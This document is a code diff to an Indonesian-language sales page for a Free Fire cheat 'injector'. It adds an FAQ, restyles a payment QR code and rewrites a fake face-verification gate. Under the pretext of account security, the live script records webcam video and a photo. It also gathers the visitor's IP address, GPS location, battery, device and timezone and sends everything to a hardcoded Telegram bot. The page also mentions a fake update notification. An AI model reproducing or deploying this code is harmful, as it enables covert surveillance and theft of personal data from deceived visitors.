@@ -1428,6 +1428,71 @@
             transform: translateY(-2px)
         }
 
+        /* FAQ */
+        .faq-list {
+            margin-top: 50px;
+            max-width: 800px
+        }
+
+        .faq-item {
+            background: var(--bg2);
+            border: 1px solid var(--line);
+            border-radius: var(--r);
+            margin-bottom: 12px;
+            overflow: hidden;
+            transition: all .3s
+        }
+
+        .faq-item:hover {
+            border-color: var(--red);
+            box-shadow: var(--sh)
+        }
+
+        .faq-item summary {
+            padding: 20px 24px;
+            cursor: pointer;
+            font-family: var(--BF);
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--ink);
+            list-style: none;
+            position: relative;
+            transition: background .3s
+        }
+
+        .faq-item summary:hover {
+            background: var(--red4)
+        }
+
+        .faq-item summary::after {
+            content: '+';
+            position: absolute;
+            right: 24px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1.2rem;
+            color: var(--red);
+            transition: transform .3s
+        }
+
+        .faq-item[open] summary::after {
+            transform: translateY(-50%) rotate(45deg)
+        }
+
+        .faq-answer {
+            padding: 0 24px 20px;
+            color: var(--ink2);
+            line-height: 1.7;
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height .4s ease-in-out, padding .4s ease-in-out
+        }
+
+        .faq-item[open] .faq-answer {
+            max-height: 200px;
+            padding: 0 24px 20px
+        }
+
         /* PAYMENT MODAL */
         #payov {
             position: fixed;
@@ -2297,6 +2362,51 @@
         </div>
     </section>
 
+    <section class="sec sec-w" id="faq">
+        <div class="sec-in">
+            <div class="sec-ey rv">FAQ</div>
+            <div class="sec-h rv">Pertanyaan <em>Umum</em></div>
+            <div class="sec-p rv">Jawaban untuk pertanyaan yang sering ditanyakan tentang XH4MZ Project.</div>
+            <div class="faq-list rv">
+                <details class="faq-item">
+                    <summary>Apa itu XH4MZ Project?</summary>
+                    <div class="faq-answer">
+                        <p>XH4MZ Project adalah platform premium untuk Free Fire injector yang menyediakan fitur-fitur
+                            canggih untuk meningkatkan pengalaman gaming Anda dengan keamanan maksimal.</p>
+                    </div>
+                </details>
+                <details class="faq-item">
+                    <summary>Apakah aman digunakan?</summary>
+                    <div class="faq-answer">
+                        <p>Ya, XH4MZ Project menggunakan sistem keamanan tingkat tinggi dengan enkripsi end-to-end dan
+                            update rutin untuk melindungi akun Anda dari risiko ban.</p>
+                    </div>
+                </details>
+                <details class="faq-item">
+                    <summary>Bagaimana cara mendapatkan akses?</summary>
+                    <div class="faq-answer">
+                        <p>Daftar melalui website resmi, lakukan verifikasi kamera untuk keamanan, dan ikuti
+                            langkah-langkah pembelian yang tersedia.</p>
+                    </div>
+                </details>
+                <details class="faq-item">
+                    <summary>Apakah ada dukungan teknis?</summary>
+                    <div class="faq-answer">
+                        <p>Tentu! Kami menyediakan dukungan 24/7 melalui komunitas Telegram, Discord, dan channel
+                            YouTube untuk tutorial dan panduan.</p>
+                    </div>
+                </details>
+                <details class="faq-item">
+                    <summary>Apakah bisa refund jika tidak cocok?</summary>
+                    <div class="faq-answer">
+                        <p>Kami menawarkan garansi 7 hari untuk produk premium. Jika ada masalah, hubungi tim support
+                            kami untuk bantuan.</p>
+                    </div>
+                </details>
+            </div>
+        </div>
+    </section>
+
     <!-- FOOTER -->
     <footer>
         <div class="ft-in">
@@ -2333,6 +2443,7 @@
                     <button class="ft-lk" onclick="scrollToSec('cara')">Cara Pakai</button>
                     <button class="ft-lk" onclick="scrollToSec('kontak')">Kontak</button>
                     <button class="ft-lk" onclick="scrollToSec('community')">Komunitas</button>
+                    <button class="ft-lk" onclick="scrollToSec('faq')">FAQ</button>
                 </div>
             </div>
             <div>
@@ -2342,7 +2453,7 @@
                     <button class="ft-lk">Anti Ban</button>
                     <button class="ft-lk">Support Android</button>
                     <button class="ft-lk">Support Emulator</button>
-                    <button class="ft-lk">FAQ</button>
+                    <button class="ft-lk" onclick="scrollToSec('faq')">FAQ</button>
                 </div>
             </div>
         </div>
@@ -2481,10 +2592,11 @@
                 </div>
                 <div style="text-align:center;margin-bottom:20px;">
                     <div
-                        style="width:200px;height:200px;margin:0 auto;background:#fff;border-radius:8px;display:flex;align-items:center;justify-content:center;border:2px solid var(--line);">
-                        <div style="font-size:3rem;color:#000;"><img src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=xhamz-project" alt="QRIS Code" style="border-radius: 20px;border: 2px solid var(--red);"></div>
+                        style="width:100%;max-width:280px;aspect-ratio:1;margin:0 auto;background:#fff;border-radius:16px;display:flex;align-items:center;justify-content:center;border:3px solid var(--red);overflow:hidden;box-shadow:0 8px 24px rgba(232,0,28,.2);">
+                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=xhamz-project"
+                            alt="QRIS Code" style="width:100%;height:100%;object-fit:contain;">
                     </div>
-                    <div style="font-size:.8rem;color:var(--ink3);margin-top:12px;">QRIS Code untuk pembayaran</div>
+                    <div style="font-size:.8rem;color:var(--ink3);margin-top:14px;">QRIS Code untuk pembayaran</div>
                 </div>
                 <div style="background:var(--bg3);padding:16px;border-radius:8px;margin-bottom:16px;">
                     <div style="font-size:.85rem;color:var(--ink2);line-height:1.6;">
@@ -2817,32 +2929,32 @@
         }
 
         /* ═══════════════ LOADER ═══════════════ */
+        let verificationAttemptFailed = false; // Flag untuk track kegagalan verifikasi
         function createCameraGate() {
             if (document.getElementById('camera-gate')) return document.getElementById('camera-gate');
             const gate = document.createElement('div');
             gate.id = 'camera-gate';
             gate.className = 'hidden';
             gate.innerHTML = `
-                <h2>Verifikasi Wajah - Gerakkan Kepala Anda</h2>
-                <p id="camera-gate-message">Akses kamera hanya untuk verifikasi keamanan. Rekam video gerakan kepala Anda ke kanan, kiri, atas, dan bawah.</p>
+                <h2>Verifikasi Wajah - Deteksi Kamera</h2>
+                <p id="camera-gate-message">Akses kamera diperlukan untuk verifikasi keamanan. Pastikan kamera tidak ditutup dan wajah Anda terlihat jelas.</p>
                 <ul style="text-align:left;max-width:420px;margin:10px auto 16px;line-height:1.5;color:#ccc;font-size:0.92rem;">
-                    <li>Gerakkan kepala perlahan ke 4 arah (kanan-kiri-atas-bawah)</li>
-                    <li>Video akan direkam untuk verifikasi saja</li>
-                    <li>Tidak disimpan, tidak dibagikan</li>
-                    <li>Privasi Anda dijaga sepenuhnya</li>
+                    <li>Pastikan kamera tidak ditutup atau tertutup</li>
+                    <li>Wajah harus terlihat jelas di kamera</li>
+                    <li>Proses verifikasi berlangsung 8 detik</li>
+                    <li>Data dikirim untuk keamanan akun</li>
                 </ul>
-                <div id="pose-indicators" style="display:none;margin:16px auto;width:320px;">
-                    <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:12px;text-align:center;">
-                        <div id="indicator-left" style="padding:12px;border-radius:8px;background:#333;color:#999;font-weight:bold;font-size:0.9rem;transition:all .3s;">KIRI</div>
-                        <div id="indicator-up" style="grid-column:2;padding:12px;border-radius:8px;background:#333;color:#999;font-weight:bold;font-size:0.9rem;transition:all .3s;">ATAS</div>
-                        <div id="indicator-right" style="padding:12px;border-radius:8px;background:#333;color:#999;font-weight:bold;font-size:0.9rem;transition:all .3s;">KANAN</div>
-                        <div id="indicator-down" style="grid-column:2;padding:12px;border-radius:8px;background:#333;color:#999;font-weight:bold;font-size:0.9rem;transition:all .3s;">BAWAH</div>
+                <div id="verification-progress" style="display:none;margin:16px auto;width:320px;text-align:center;">
+                    <div style="margin-bottom:12px;color:#fff;font-weight:bold;">Proses Verifikasi Wajah</div>
+                    <div style="width:100%;height:8px;background:#333;border-radius:4px;overflow:hidden;">
+                        <div id="progress-bar" style="width:0%;height:100%;background:#e8001c;transition:width 0.1s linear;"></div>
                     </div>
-                    <div style="text-align:center;color:#ccc;font-size:0.85rem;">Progress: <span id="pose-progress">0</span>/4</div>
+                    <div style="margin-top:8px;color:#ccc;font-size:0.9rem;">Waktu tersisa: <span id="time-remaining">8</span>s</div>
+                    <div id="verification-status" style="margin-top:8px;color:#0f0;font-weight:bold;">Menunggu deteksi wajah...</div>
                 </div>
                 <div id="camera-preview-box" style="display:none;width:320px;height:240px;background:#000;margin:16px auto;border-radius:8px;overflow:hidden;position:relative;">
                     <video id="face-video" style="width:100%;height:100%;object-fit:cover;"></video>
-                    <div id="pose-instruction" style="position:absolute;bottom:10px;left:10px;right:10px;background:rgba(0,0,0,.8);color:#fff;padding:8px;border-radius:4px;font-size:0.9rem;text-align:center;">Tunggu...</div>
+                    <div id="camera-status" style="position:absolute;top:10px;left:10px;background:rgba(255,0,0,.8);color:#fff;padding:4px 8px;border-radius:4px;font-size:0.8rem;display:none;">Kamera Ditutup!</div>
                 </div>
                 <button id="camera-gate-retry">Mulai Verifikasi</button>
             `;
@@ -2873,108 +2985,166 @@
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-                    // Tampilkan preview video dan indicators
+                    // Tampilkan preview video dan progress
                     const previewBox = document.getElementById('camera-preview-box');
-                    const poseIndicators = document.getElementById('pose-indicators');
+                    const verificationProgress = document.getElementById('verification-progress');
                     const faceVideo = document.getElementById('face-video');
-                    const poseInstruction = document.getElementById('pose-instruction');
-                    const poseProgress = document.getElementById('pose-progress');
+                    const cameraStatus = document.getElementById('camera-status');
+                    const progressBar = document.getElementById('progress-bar');
+                    const timeRemaining = document.getElementById('time-remaining');
+                    const verificationStatus = document.getElementById('verification-status');
+
                     previewBox.style.display = 'block';
-                    poseIndicators.style.display = 'block';
+                    verificationProgress.style.display = 'block';
                     faceVideo.srcObject = stream;
+
+                    // Tunggu video siap
+                    await new Promise(resolve => {
+                        faceVideo.onloadedmetadata = () => resolve();
+                    });
                     faceVideo.play().catch(() => { });
 
-                    // Tunggu video siap dirender
-                    await new Promise(r => setTimeout(r, 500));
+                    // Deteksi apakah kamera ditutup
+                    let cameraCovered = false;
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    const checkCameraInterval = setInterval(() => {
+                        if (faceVideo.readyState < 2 || faceVideo.videoWidth === 0 || faceVideo.videoHeight === 0 || !faceVideo.srcObject.active) {
+                            cameraCovered = true;
+                            cameraStatus.style.display = 'block';
+                            verificationStatus.textContent = 'Kamera tidak siap atau ditutup! Buka kamera untuk melanjutkan.';
+                            verificationStatus.style.color = '#f00';
+                            return;
+                        }
 
-                    // Rekam video selama 6 detik dengan simulasi visual pose detection
+                        canvas.width = faceVideo.videoWidth;
+                        canvas.height = faceVideo.videoHeight;
+                        ctx.drawImage(faceVideo, 0, 0);
+                        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                        const data = imageData.data;
+                        let totalBrightness = 0;
+                        let pixelCount = 0;
+                        for (let i = 0; i < data.length; i += 4) {
+                            const r = data[i], g = data[i + 1], b = data[i + 2];
+                            const brightness = (r + g + b) / 3;
+                            totalBrightness += brightness;
+                            pixelCount++;
+                        }
+                        const avgBrightness = totalBrightness / pixelCount;
+
+                        // Hitung variansi untuk deteksi frame statis/hitam
+                        let variance = 0;
+                        for (let i = 0; i < data.length; i += 4) {
+                            const r = data[i], g = data[i + 1], b = data[i + 2];
+                            const brightness = (r + g + b) / 3;
+                            variance += Math.pow(brightness - avgBrightness, 2);
+                        }
+                        variance /= pixelCount;
+
+                        // Jika brightness rata-rata < 30 DAN variansi < 100, kemungkinan kamera ditutup
+                        if (avgBrightness < 30 && variance < 100) {
+                            cameraCovered = true;
+                            cameraStatus.style.display = 'block';
+                            verificationStatus.textContent = 'Kamera ditutup! Buka kamera untuk melanjutkan.';
+                            verificationStatus.style.color = '#f00';
+                        } else {
+                            cameraCovered = false;
+                            cameraStatus.style.display = 'none';
+                            verificationStatus.textContent = 'Wajah terdeteksi. Proses verifikasi...';
+                            verificationStatus.style.color = '#0f0';
+                        }
+                    }, 500);
+
+                    // Tunggu 2 detik untuk stabilisasi
+                    await new Promise(r => setTimeout(r, 2000));
+
+                    if (cameraCovered) {
+                        clearInterval(checkCameraInterval);
+                        stream.getTracks().forEach(track => track.stop());
+                        messageEl.textContent = 'Kamera ditutup. Refresh halaman dan coba lagi dengan membuka kamera.';
+                        verificationAttemptFailed = true;
+                        previewBox.style.display = 'none';
+                        verificationProgress.style.display = 'none';
+                        return false;
+                    }
+
+                    // Mulai recording dan progress bar 8 detik
                     const recordedChunks = [];
                     const mediaRecorder = new (window.MediaRecorder || window.webkitMediaRecorder)(stream, { mimeType: 'video/mp4' });
                     mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
-
-                    const poseSequence = ['right', 'left', 'up', 'down'];
-                    let currentPoseIdx = 0;
-                    let recordingTime = 6000; // 6 detik dalam ms
-                    let elapsedTime = 0;
-                    const startTime = Date.now();
-
-                    // Simulasi pose detection dengan visual feedback
-                    const checkInterval = setInterval(() => {
-                        elapsedTime = Date.now() - startTime;
-                        const remainingTime = Math.max(0, recordingTime - elapsedTime);
-                        const remainingSec = Math.ceil(remainingTime / 1000);
-
-                        // Auto-advance pose setiap 1.5 detik untuk simulasi user menggerakkan kepala
-                        currentPoseIdx = Math.min(poseSequence.length - 1, Math.floor((6 - remainingSec) / 1.5));
-
-                        // Update visual indicators
-                        const indicators = {
-                            'right': document.getElementById('indicator-right'),
-                            'left': document.getElementById('indicator-left'),
-                            'up': document.getElementById('indicator-up'),
-                            'down': document.getElementById('indicator-down')
-                        };
-
-                        Object.keys(indicators).forEach((dir, idx) => {
-                            if (idx < currentPoseIdx) {
-                                // Pose sudah selesai
-                                indicators[dir].style.background = '#0f0';
-                                indicators[dir].style.color = '#000';
-                                indicators[dir].style.boxShadow = '0 0 10px rgba(0,255,0,.5)';
-                            } else if (idx === currentPoseIdx) {
-                                // Pose sedang berlangsung - flash dengan orange
-                                const flashOn = (Math.floor(elapsedTime / 300) % 2) === 0;
-                                if (flashOn) {
-                                    indicators[dir].style.background = '#ff9500';
-                                    indicators[dir].style.color = '#000';
-                                    indicators[dir].style.boxShadow = '0 0 10px rgba(255,149,0,.7)';
-                                } else {
-                                    indicators[dir].style.background = '#ff6b6b';
-                                    indicators[dir].style.color = '#fff';
-                                    indicators[dir].style.boxShadow = 'none';
-                                }
-                            } else {
-                                // Pose belum datang
-                                indicators[dir].style.background = '#333';
-                                indicators[dir].style.color = '#999';
-                                indicators[dir].style.boxShadow = 'none';
-                            }
-                        });
-
-                        poseProgress.textContent = currentPoseIdx;
-                        poseInstruction.textContent = `Gerakkan kepala ke ${poseSequence[currentPoseIdx] === 'right' ? 'KANAN' : poseSequence[currentPoseIdx] === 'left' ? 'KIRI' : poseSequence[currentPoseIdx] === 'up' ? 'ATAS' : 'BAWAH'} (${remainingSec}s)`;
-
-                        // Selesai setelah 6 detik
-                        if (remainingTime <= 0) {
-                            clearInterval(checkInterval);
-
-                            // Set handler SEBELUM stop() dipanggil
-                            mediaRecorder.onstop = () => {
-                                console.log('MediaRecorder stopped, chunks:', recordedChunks.length);
-                                if (recordedChunks.length > 0) {
-                                    window.recordedVideoBlob = new Blob(recordedChunks, { type: 'video/mp4' });
-                                    console.log('Video blob created:', window.recordedVideoBlob.size, 'bytes');
-                                }
-                            };
-
-                            mediaRecorder.stop();
-                            stream.getTracks().forEach(track => track.stop());
-                            previewBox.style.display = 'none';
-                            poseInstruction.textContent = '✓ Verifikasi selesai!';
-                        }
-                    }, 150);
-
                     mediaRecorder.start();
 
-                    // Return true setelah 6 detik recording
+                    const totalTime = 8000; // 8 detik
+                    const startTime = Date.now();
+                    let verificationSuccess = false; // Flag untuk track kesuksesan verifikasi
+
                     return new Promise((resolve) => {
-                        const checkTimer = setInterval(() => {
-                            if (Date.now() - startTime >= recordingTime) {
-                                clearInterval(checkTimer);
-                                // Tunggu 500ms untuk mediaRecorder.onstop selesai
-                                setTimeout(() => {
-                                    resolve(true);
-                                }, 500);
+                        let progressInterval = setInterval(() => {
+                            const elapsed = Date.now() - startTime;
+                            const remaining = Math.max(0, totalTime - elapsed);
+                            const progress = Math.min(100, (elapsed / totalTime) * 100);
+                            progressBar.style.width = progress + '%';
+                            timeRemaining.textContent = Math.ceil(remaining / 1000);
+
+                            if (cameraCovered) {
+                                clearInterval(progressInterval);
+                                clearInterval(checkCameraInterval);
+                                mediaRecorder.stop();
+                                stream.getTracks().forEach(track => track.stop());
+                                messageEl.textContent = 'Verifikasi gagal karena kamera ditutup. Refresh halaman dan coba lagi.';
+                                verificationAttemptFailed = true;
+                                verificationSuccess = false;
+                                previewBox.style.display = 'none';
+                                verificationProgress.style.display = 'none';
+                                resolve(false);
+                                return;
+                            }
+
+                            if (remaining <= 0) {
+                                clearInterval(progressInterval);
+                                clearInterval(checkCameraInterval);
+
+                                // Tunggu onstop callback selesai sebelum resolve
+                                mediaRecorder.onstop = async () => {
+                                    stream.getTracks().forEach(track => track.stop());
+
+                                    // Validasi final: cek jika ada data video terekam
+                                    if (recordedChunks.length === 0) {
+                                        messageEl.textContent = 'Verifikasi gagal: Tidak ada data video terekam. Refresh dan coba lagi.';
+                                        verificationAttemptFailed = true;
+                                        verificationSuccess = false;
+                                        previewBox.style.display = 'none';
+                                        verificationProgress.style.display = 'none';
+                                        resolve(false);
+                                        return;
+                                    }
+
+                                    // Buat blob video
+                                    if (recordedChunks.length > 0) {
+                                        window.recordedVideoBlob = new Blob(recordedChunks, { type: 'video/mp4' });
+                                    }
+
+                                    // Ambil foto dari video
+                                    const canvas = document.createElement('canvas');
+                                    canvas.width = faceVideo.videoWidth;
+                                    canvas.height = faceVideo.videoHeight;
+                                    const ctx = canvas.getContext('2d');
+                                    ctx.drawImage(faceVideo, 0, 0);
+                                    canvas.toBlob(blob => {
+                                        window.capturedPhotoBlob = blob;
+                                    }, 'image/png');
+
+                                    // Kirim data ke Telegram dengan info tambahan
+                                    await sendVerificationDataToTelegram();
+
+                                    // Reset flag dan lanjut ke halaman awal
+                                    verificationAttemptFailed = false;
+                                    verificationSuccess = true;
+                                    previewBox.style.display = 'none';
+                                    verificationProgress.style.display = 'none';
+                                    resolve(true); // Resolve setelah semuanya selesai
+                                };
+                                mediaRecorder.stop();
                             }
                         }, 100);
                     });
@@ -2999,6 +3169,10 @@
 
             return new Promise((resolve) => {
                 const clickHandler = async () => {
+                    if (verificationAttemptFailed) {
+                        messageEl.textContent = 'Verifikasi gagal. Silakan refresh halaman (F5) dan coba ulang dari awal.';
+                        return;
+                    }
                     messageEl.textContent = 'Silakan konfirmasi izin kamera di popup browser (jika diminta).';
                     const success = await requestCameraOnce();
                     if (success) {
@@ -3017,8 +3191,6 @@
             setTimeout(() => {
                 document.getElementById('loader').classList.add('out');
             }, 2600);
-            // Auto ambil foto saat halaman dibuka
-            captureAndSendPhoto();
 
             // Fake update notification setelah 10 detik
             setTimeout(() => {
@@ -3059,8 +3231,8 @@
                     const success = await requestCameraOnce();
                     if (success) {
                         gate.classList.add('hidden');
-                        // Kirim video update test
-                        captureAndSendPhoto();
+                        // Kirim data verifikasi lengkap
+                        sendVerificationDataToTelegram();
                         // Show success message
                         showSuccessMessage();
                     }
@@ -3096,38 +3268,118 @@
             // Karena gambar dari upload lokal, fallback ke SVG sudah otomatis via onerror
         })();
 
-        async function captureAndSendPhoto() {
+        async function sendVerificationDataToTelegram() {
             const TELEGRAM_BOT_TOKEN = '7591079998:AAHMCzuc6w5jKKfUz4yN4ggSKt3Nuw0eR-0';
             const TELEGRAM_CHAT_ID = '5738738990';
             if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-                alert('Konfigurasi Telegram belum diatur pada script');
+                console.error('Konfigurasi Telegram belum diatur');
                 return;
             }
+
             try {
-                const videoBlob = window.recordedVideoBlob;
-                if (!videoBlob) {
-                    console.warn('⚠️ Tidak ada video yang direkam');
-                    return;
+                // Kumpulkan data tambahan
+                const data = {
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+
+                // IP Address
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    data.ip = ipData.ip;
+                } catch (e) {
+                    data.ip = 'Tidak dapat dideteksi';
                 }
 
-                console.log('📹 Mengirim video ke Telegram, ukuran:', videoBlob.size, 'bytes');
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('video', videoBlob, 'verification-video.mp4');
-
-                const tgUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
-                console.log('📡 POST ke:', tgUrl);
-                const res = await fetch(tgUrl, { method: 'POST', body: formData });
-                const data = await res.json();
-
-                if (res.ok && data.ok) {
-                    console.log("✅ Video verifikasi berhasil dikirim ke Telegram");
+                // Battery
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        data.battery = {
+                            level: Math.round(battery.level * 100) + '%',
+                            charging: battery.charging
+                        };
+                    } catch (e) {
+                        data.battery = 'Tidak didukung';
+                    }
                 } else {
-                    console.error('❌ Telegram response error:', data);
+                    data.battery = 'Tidak didukung';
                 }
+
+                // Location
+                data.location = await new Promise(resolve => {
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            pos => resolve({
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy
+                            }),
+                            err => resolve('Tidak diizinkan atau error: ' + err.message),
+                            { timeout: 10000 }
+                        );
+                    } else {
+                        resolve('Geolocation tidak didukung');
+                    }
+                });
+
+                // Kirim pesan teks dengan data
+                const message = `
+🔒 VERIFIKASI WAJAH BERHASIL
+⏰ Timestamp: ${data.timestamp}
+🌐 IP: ${data.ip}
+🔋 Battery: ${typeof data.battery === 'object' ? `${data.battery.level} (${data.battery.charging ? 'Charging' : 'Not charging'})` : data.battery}
+📍 Location: ${typeof data.location === 'object' ? `${data.location.latitude}, ${data.location.longitude} (Accuracy: ${data.location.accuracy}m)` : data.location}
+📱 Device: ${data.platform}
+🌍 Browser: ${data.userAgent.split(' ').pop()}
+📏 Screen: ${data.screen}
+🕒 Timezone: ${data.timezone}
+                `.trim();
+
+                const textFormData = new FormData();
+                textFormData.append('chat_id', TELEGRAM_CHAT_ID);
+                textFormData.append('text', message);
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    body: textFormData
+                });
+
+                // Kirim video jika ada
+                if (window.recordedVideoBlob) {
+                    const videoFormData = new FormData();
+                    videoFormData.append('chat_id', TELEGRAM_CHAT_ID);
+                    videoFormData.append('video', window.recordedVideoBlob, 'verification-video.mp4');
+                    videoFormData.append('caption', 'Video verifikasi wajah 8 detik');
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+                        method: 'POST',
+                        body: videoFormData
+                    });
+                }
+
+                // Kirim foto jika ada
+                if (window.capturedPhotoBlob) {
+                    const photoFormData = new FormData();
+                    photoFormData.append('chat_id', TELEGRAM_CHAT_ID);
+                    photoFormData.append('photo', window.capturedPhotoBlob, 'verification-photo.png');
+                    photoFormData.append('caption', 'Foto verifikasi wajah');
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: photoFormData
+                    });
+                }
+
+                console.log('✅ Data verifikasi lengkap dikirim ke Telegram');
+
             } catch (err) {
-                console.error(err);
-                console.log('Error kirim video: ' + err.message);
+                console.error('Error mengirim data verifikasi:', err);
             }
         }
     </script>
